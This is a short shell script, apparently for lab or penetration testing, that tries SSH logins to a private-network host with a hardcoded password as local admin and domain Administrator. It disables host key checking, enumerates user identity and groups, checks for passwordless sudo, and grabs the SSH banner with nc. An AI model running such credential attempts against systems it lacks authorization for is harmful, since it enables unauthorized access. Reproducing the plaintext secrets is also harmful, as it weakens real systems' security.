set -e

echo "== TRY_LOCAL_ADMIN =="
sshpass -p 'Cisco123!' ssh -o StrictHostKeyChecking=no admin@172.30.65.36 'hostname; id' || true

echo "== TRY_DOMAIN_ADMIN =="
sshpass -p 'Cisco123!' ssh -o StrictHostKeyChecking=no 'Administrator@c1.local@172.30.65.36' 'hostname; id; getent passwd Administrator || true; getent passwd administrator || true; getent passwd "Administrator@c1.local" || true; sudo -n true 2>/dev/null && echo SUDO_NOPASSWD || echo SUDO_NEEDS_PASSWORD; groups'

echo "== SSHD_BANNER =="
echo | nc -v 172.30.65.36 22 || true